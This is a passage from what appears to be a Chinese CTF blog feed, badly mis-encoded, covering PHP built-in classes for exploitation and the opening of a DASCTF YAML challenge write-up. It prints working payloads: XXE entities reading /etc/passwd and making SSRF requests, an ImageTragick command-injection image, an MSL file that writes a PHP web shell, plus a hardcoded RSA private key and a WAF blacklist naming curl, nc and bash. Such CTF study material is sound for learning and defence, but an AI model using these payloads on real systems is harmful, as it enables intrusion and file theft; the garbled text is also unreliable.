å¯†æ¶ˆæ¯</span><br>    encrypted_message = base64.b64decode(encrypted_message_b64)<br>    <span class="hljs-comment"># å¯¼å…¥ç§é’¥</span><br>    key = RSA.import_key(private_key)<br>    <span class="hljs-comment"># åˆ›å»ºè§£å¯†å™¨</span><br>    cipher = PKCS1_OAEP.new(key)<br>    <span class="hljs-comment"># è§£å¯†å¹¶è¿”å›ç»“æœ</span><br>    <span class="hljs-keyword">return</span> cipher.decrypt(encrypted_message).decode()<br><br><span class="hljs-comment"># ç¬¬äºŒä¸ªç§é’¥ï¼ˆå®é™…èƒ½è§£å¯†çš„ç§é’¥ï¼‰</span><br>private_key = <span class="hljs-string">b&#x27;&#x27;&#x27;-----BEGIN RSA PRIVATE KEY-----</span><br><span class="hljs-string">MIICXQIBAAKBgQCvNhcDwDMhZl3dJt0+gkvu/cQuRFM58aqCDRLfS5bnCMPFXFi8</span><br><span class="hljs-string">aHrYZNC7Tz/DrenOSUCv+d+4sZqjRW8GsbOR8DWK7wNO3SliQ8MmiY2jfF5omPaU</span><br><span class="hljs-string">5OJiGUuAYLbYeIUkvEn6Zf10hmwuaGwku5qgEEPppfaUtleFsOFjdYMbnQIDAQAB</span><br><span class="hljs-string">AoGACZwbXgrMIyBUtJz9lICb/pMvj+QSdoKhOfnSl6mzMJ/D8Q60FT1bw4OgCS37</span><br><span class="hljs-string">DtX6lWRiJmS7lwsyspLL2J+lfBuq2PrES/SRcp4TausDemtRfQVbKmBEcfy0oIn3</span><br><span class="hljs-string">DM7dT4EAhUSI2Z4Y6nX+3yztwQV0ReeYdlg2P8eOprftvVcCQQC3kpHbwv9kHa5N</span><br><span class="hljs-string">z49QFV5W1XHCD4KE3wC1xm/9dWbOMrGkR2v7CIXYoRcD6hg4kv5JzKPOaYYpygqZ</span><br><span class="hljs-string">qRR/uWfPAkEA9FcBpiiB1b7Ozxk7Gz6NF94MQItJ0xTrArArllBheAhIjaDAjX1z</span><br><span class="hljs-string">OQ++RGZVByXVLmPyWJNK93uR0tqQOju00wJACjRIjVnCjpMjzEl8Yuw9KUCGKU5p</span><br><span class="hljs-string">Z+9pf7E/KmyrQU0KGOKrevHXVtpliB8sJ4DsR7frZx7wiUQk4LPIYu0wewJBAIQo</span><br><span class="hljs-string">64NsNY3ffw0VoJrD4p0eRZJDxNKfZd42W90Z7R53nIa+hGgDiuc6VLe6ghMzq3NE</span><br><span class="hljs-string">LDksskfaVq2t+oUE9nECQQCptxk0oH5dwDttlWa0esz9V+HdMY4tQlvUuHUwCY9D</span><br><span class="hljs-string">slrK1kk630BceGayC2TYOvfdco7iui5HYIJ4W5ff3RRB</span><br><span class="hljs-string">-----END RSA PRIVATE KEY-----&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># ç¬¬äºŒä¸ªåŠ å¯†æ¶ˆæ¯ï¼ˆå®é™…èƒ½è§£å¯†çš„æ¶ˆæ¯ï¼‰</span><br>encrypted_msg = <span class="hljs-string">&quot;UpyynVxi3qhqCLRI+lsKnLZ4QrXmUCnmh8fRUR4yHbl49I2CnlwBmKtbOKKcXQCKBMrZ2sedeh7UiVBth5peL0IarRC/GHevnZOF2Bw48E5g5DAzzMsotqnDV0NZpKMuqyXtSeqm9I/gMUKzbPzBtwmmGQ66vCjswrdXghcmUc4=&quot;</span><br><br><span class="hljs-comment"># è§£å¯†å¹¶è¾“å‡º</span><br>decrypted = decrypt_message(encrypted_msg, private_key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è§£å¯†ç»“æœ:&quot;</span>, decrypted)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯æ—¥ä¸€web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
      <tag>æ–‡ä»¶åŒ…å«</tag>
      
      <tag>phpååºåˆ—åŒ–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPåŸç”Ÿç±»</title>
    <link href="/2025/01/24/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    <url>/2025/01/24/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡ä»‹ç»phpå¸¸ç”¨çš„åŸç”Ÿç±»</p><p>åœ¨phpä¸­åªè¦å‡½æ•°åå’Œå‚æ•°å¯æ§ï¼Œé‚£ä¹ˆä½¿ç”¨phpåŸç”Ÿç±»ä¼šæœ‰å¾ˆå¤§ä½œç”¨</p><blockquote><p>å‰æï¼š<code>php.ini</code> ä¸­é€šè¿‡ <code>disable_classes</code> é™åˆ¶</p></blockquote><h1 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h1><h2 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a><strong>DirectoryIterator</strong></h2><p>ç”¨æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">ä¼ å…¥è·¯å¾„è¿›è¡Œæ‰«æ<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;/path/to/directory&#x27;</span>);<br>å¯é…åˆglobä¼ªåè®®è¿›è¡Œç²¾ç¡®è¯»å–<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///f*&#x27;</span>); è¯»å–æ ¹ç›®å½•ä¸‹ä»¥få¼€å¤´çš„æ–‡ä»¶<br></code></pre></td></tr></table></figure><blockquote><p>ä¸€èˆ¬æƒ…å†µä¸èƒ½éå†è¾“å‡ºé‚£ä¹ˆå°±åªèƒ½è¾“å‡ºä¸€ä¸ª</p></blockquote><h2 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a><strong>FilesystemIterator</strong></h2><p>ä¸DirectoryIteratorç›¸æ¯”å…·æœ‰æ›´å¥½çš„æ€§èƒ½ï¼Œç”¨æ³•å…¶å®æ˜¯ä¸€æ ·çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">ä¼ å…¥è·¯å¾„è¿›è¡Œæ‰«æ<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;/path/to/directory&#x27;</span>);<br>å¯é…åˆglobä¼ªåè®®è¿›è¡Œç²¾ç¡®è¯»å–<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///f*&#x27;</span>); è¯»å–æ ¹ç›®å½•ä¸‹ä»¥få¼€å¤´çš„æ–‡ä»¶<br></code></pre></td></tr></table></figure><blockquote><p>ä¸€èˆ¬æƒ…å†µä¸èƒ½éå†è¾“å‡ºé‚£ä¹ˆå°±åªèƒ½è¾“å‡ºä¸€ä¸ª</p></blockquote><h2 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a><strong>GlobIterator</strong></h2><p><code>GlobIterator</code> æ˜¯ PHP çš„å†…ç½®ç±»ï¼Œç»§æ‰¿è‡ª <code>FilesystemIterator</code>ï¼Œä¸“ä¸º <strong>åŸºäºé€šé…ç¬¦æ¨¡å¼ï¼ˆglobï¼‰çš„æ–‡ä»¶éå†</strong> è®¾è®¡ã€‚å®ƒç®€åŒ–äº†æŒ‰æ¨¡å¼åŒ¹é…æ–‡ä»¶çš„è¿‡ç¨‹ï¼Œæ— éœ€æ‰‹åŠ¨è¿‡æ»¤æ–‡ä»¶åï¼Œé€‚ç”¨äºå¿«é€Ÿæšä¸¾æ–‡ä»¶ç³»ç»Ÿæˆ–æŸ¥æ‰¾ç‰¹å®šæ–‡ä»¶ã€‚</p><p>ç”¨æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">ç›´æ¥è¾“å…¥é€šé…ç¬¦ä½¿ç”¨<br><span class="hljs-variable">$iterator</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&#x27;*.php&#x27;</span>);<br>æˆ–è€…é…åˆè·¯å¾„ä½¿ç”¨ æŸ¥æ‰¾è·¯å¾„ä¸‹åŒ¹é…çš„æ–‡ä»¶<br><span class="hljs-variable">$iterator</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&#x27;/var/www/*.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h1 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h1><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a><strong>SplFileObject</strong></h2><p><code>SplFileObject</code> æ˜¯ PHP çš„å†…ç½®ç±»ï¼Œç»§æ‰¿è‡ª <code>SplFileInfo</code>ï¼Œä¸“ä¸º <strong>é«˜æ•ˆè¯»å†™æ–‡ä»¶</strong> è®¾è®¡ã€‚å®ƒåœ¨ CTF ä¸­å¸¸ç”¨äº <strong>æ–‡ä»¶å†…å®¹è¯»å–</strong>ã€<strong>æºç æ³„éœ²</strong> å’Œ <strong>ç‰¹æ®Šåè®®åˆ©ç”¨</strong>ï¼Œå°¤å…¶æ˜¯åœ¨ååºåˆ—åŒ–æˆ–æ–‡ä»¶æ“ä½œæ¼æ´åœºæ™¯ä¸­</p><p>ç”¨æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">ç›´æ¥è¯»å–æ–‡ä»¶<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br>é…åˆä¼ªåè®®è¯»å–æ–‡ä»¶<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=h1nt.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a><strong><code>SimpleXMLElement</code></strong></h2><p><code>SimpleXMLElement</code> æ˜¯ PHP çš„å†…ç½®ç±»ï¼Œç”¨äºè§£æå’Œæ“ä½œ XML æ•°æ®ã€‚åœ¨ CTF ä¸­ï¼Œå®ƒå¸¸è¢«ç”¨äº <strong>XXEï¼ˆXML External Entityï¼‰æ”»å‡»</strong>ï¼Œé€šè¿‡æ„é€ æ¶æ„ XML å®ä½“å®ç° <strong>æ–‡ä»¶è¯»å–</strong>ã€<strong>SSRFï¼ˆæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼‰</strong> æˆ– <strong>è¿œç¨‹ä»£ç æ‰§è¡Œ</strong>ã€‚</p><p>åŸºæœ¬ç”¨æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sxe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-string">&#x27;data.xml&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">// ä»æ–‡ä»¶åŠ è½½</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sxe</span>-&gt;user;<br></code></pre></td></tr></table></figure><p>å¯ä»¥è§£æXMLå®ä½“æ–‡ä»¶é‚£ä¹ˆå¯ä¸å¯ä»¥è‡ªå·±å†™ä¸ªXMLæ–‡ä»¶å®ç°rceæˆ–è€…ä»»æ„æ–‡ä»¶è¯»å–å‘¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//é…åˆä¼ªåè®®è¯»å–æ–‡ä»¶</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&lt;&lt;&lt;XML</span><br><span class="hljs-string">&lt;!DOCTYPE test [</span><br><span class="hljs-string">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br><span class="hljs-string">XML</span>;<br><br><span class="hljs-comment">// éœ€è¦å…³é—­å®ä½“åŠ è½½å™¨é™åˆ¶ï¼ˆPHP &lt; 8.0ï¼‰</span><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$sxe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-variable">$payload</span>, LIBXML_NOENT);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sxe</span>; <span class="hljs-comment">// è¾“å‡º /etc/passwd å†…å®¹</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//è¿›è¡Œssrfï¼Œè¿›è¡Œå¤–å¸¦ç­‰æ“ä½œ</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&lt;&lt;&lt;XML</span><br><span class="hljs-string">&lt;!DOCTYPE test [</span><br><span class="hljs-string">    &lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.1:8080/&quot;&gt;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br><span class="hljs-string">XML</span>;<br><br><span class="hljs-variable">$sxe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-variable">$payload</span>, LIBXML_NOENT);<br></code></pre></td></tr></table></figure><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="Imagick"><a href="#Imagick" class="headerlink" title="Imagick"></a><strong><code>Imagick</code></strong></h2><p><code>Imagick</code> æ˜¯ PHP çš„å›¾åƒå¤„ç†æ‰©å±•ï¼Œæ”¯æŒå¤šç§å›¾åƒæ ¼å¼çš„æ“ä½œã€‚åœ¨ CTF ä¸­ï¼Œå®ƒå¸¸è¢«ç”¨äº <strong>æ¶æ„å›¾åƒåˆ©ç”¨</strong> å’Œ <strong>æ–‡ä»¶è¯»å–&#x2F;å‘½ä»¤æ‰§è¡Œ</strong></p><blockquote><p>CVE-2016-3714:å…è®¸é€šè¿‡æ¶æ„å›¾åƒæ‰§è¡Œå‘½ä»¤ï¼Œåˆ©ç”¨æœ¬å‡½æ•°</p></blockquote><p>å…ˆä¸Šä¼ æ¶æ„å›¾ç‰‡</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">push graphic-context<br>viewbox 0 0 640 480<span class="hljs-built_in"></span><br><span class="hljs-built_in">fill </span>&#x27;url(https://example.com/image.jpg<span class="hljs-string">&quot;|ls -la &gt; /tmp/result&quot;</span>)&#x27;<br>pop graphic-context<br></code></pre></td></tr></table></figure><p>åœ¨è§¦å‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$imagick</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>(<span class="hljs-string">&#x27;exploit.png&#x27;</span>); <span class="hljs-comment">// è¯»å–æ¶æ„å›¾åƒ</span><br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;output.png&#x27;</span>);    <span class="hljs-comment">// è§¦å‘å‘½ä»¤</span><br></code></pre></td></tr></table></figure><p>MSL è„šæœ¬åˆ©ç”¨</p><p>ä¸Šä¼ æ¶æ„mslæ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">image</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;caption:&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;output.php&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>è§¦å‘ MSL è„šæœ¬</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$imagick</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>();<br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">readImage</span>(<span class="hljs-string">&#x27;msl:poc.msl&#x27;</span>); <span class="hljs-comment">// åŠ è½½ MSL è„šæœ¬</span><br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;dummy.png&#x27;</span>);  <span class="hljs-comment">// ç”Ÿæˆ output.php</span><br></code></pre></td></tr></table></figure><p>è®¿é—® <code>output.php?cmd=id</code> å³å¯æ‰§è¡Œå‘½ä»¤</p><p>é€šè¿‡ <code>caption:</code> åè®®è¯»å–æœ¬åœ°æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$imagick</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>(<span class="hljs-string">&#x27;caption:&lt;?php echo file_get_contents(&quot;/flag&quot;); ?&gt;&#x27;</span>);<br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;output.php&#x27;</span>); <span class="hljs-comment">// ç”ŸæˆåŒ…å« Flag çš„ PHP æ–‡ä»¶</span><br></code></pre></td></tr></table></figure><h1 id="ä¿¡æ¯æ³„éœ²"><a href="#ä¿¡æ¯æ³„éœ²" class="headerlink" title="ä¿¡æ¯æ³„éœ²"></a>ä¿¡æ¯æ³„éœ²</h1><h2 id="Errorå’ŒException"><a href="#Errorå’ŒException" class="headerlink" title="Errorå’ŒException"></a>Errorå’ŒException</h2><p>å¯¹äºæ²¡æœ‰å›æ˜¾çš„rceå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exploit</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;message = <span class="hljs-variable">$cmd</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;message); <span class="hljs-comment">// è§¦å‘å‘½ä»¤æ‰§è¡Œä½†æ˜¯æ²¡æœ‰å›æ˜¾</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// æ„é€  Error å¯¹è±¡ï¼Œåˆ©ç”¨å…¶ __toString æ–¹æ³•</span><br><span class="hljs-variable">$error</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>((<span class="hljs-keyword">string</span>) <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exploit</span>(<span class="hljs-string">&#x27;id&#x27;</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$error</span>; <span class="hljs-comment">// è¾“å‡ºå‘½ä»¤æ‰§è¡Œç»“æœ</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHPåŸç”Ÿç±»</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025.1.24</title>
    <link href="/2025/01/24/2025-1-24/"/>
    <url>/2025/01/24/2025-1-24/</url>
    
    <content type="html"><![CDATA[<h2 id="DASCTF-2024æœ€åä¸€æˆ˜ï½œå¯’å¤œç ´æ™“ï¼Œå†¬è‡³ç»ˆç« -yaml-matser"><a href="#DASCTF-2024æœ€åä¸€æˆ˜ï½œå¯’å¤œç ´æ™“ï¼Œå†¬è‡³ç»ˆç« -yaml-matser" class="headerlink" title="DASCTF 2024æœ€åä¸€æˆ˜ï½œå¯’å¤œç ´æ™“ï¼Œå†¬è‡³ç»ˆç« ]yaml_matser"></a>DASCTF 2024æœ€åä¸€æˆ˜ï½œå¯’å¤œç ´æ™“ï¼Œå†¬è‡³ç»ˆç« ]yaml_matser</h2><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> yaml<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, render_template<br><br><br>app = Flask(__name__, template_folder=<span class="hljs-string">&#x27;templates&#x27;</span>)<br><br>UPLOAD_FOLDER = <span class="hljs-string">&#x27;uploads&#x27;</span><br>os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">input_str</span>):<br><br><br>    blacklist_terms = &#123;<span class="hljs-string">&#x27;apply&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;map&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;sleep&#x27;</span>, <span class="hljs-string">&#x27;setstate&#x27;</span>,<br>                       <span class="hljs-string">&#x27;command&#x27;</span>,<span class="hljs-string">&#x27;static&#x27;</span>,<span class="hljs-string">&#x27;templates&#x27;</span>,<span class="hljs-string">&#x27;session&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>,<span class="hljs-string">&#x27;builtins&#x27;</span><br>                       <span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;ntimeit&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;zsh&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;curl&#x27;</span>, <span class="hljs-string">&#x27;nc&#x27;</span>, <span class="hljs-string">&#x27;env&#x27;</span>, <span class="hljs-string">&#x27;before_request&#x27;</span>, <span class="hljs-string">&#x27;after_request&#x27;</span>,<br>                       <span class="hljs-string">&#x27;error_handler&#x27;</span>, <span class="hljs-string">&#x27;add_url_rule&#x27;</span>,<span class="hljs-string">&#x27;teardown_request&#x27;</span>,<span class="hljs-string">&#x27;teardown_appcontext&#x27;</span>,<span class="hljs-string">&#x27;\\u&#x27;</span>,<span class="hljs-string">&#x27;\\x&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;base64&#x27;</span>,<span class="hljs-string">&#x27;join&#x27;</span>&#125;<br><br>    input_str_lower = <span class="hljs-built_in">str</span>(input_str).lower()<br><br><br>    <span class="hljs-keyword">for</span> term <span class="hljs-keyword">in</span> blacklist_terms:<br>        <span class="hljs-keyword">if</span> term <span class="hljs-keyword">in</span> input_str_lower:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found blacklisted term: <span class="hljs-subst">&#123;term&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><br>file_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;.*\.yaml$&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_yaml_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(file_pattern.<span class="hljs-keyword">match</span>(filename))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Welcome to DASCTF X 0psu3</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Enjoy it &lt;a href=&quot;/Yam1&quot;&gt;Yam1&lt;/a&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>           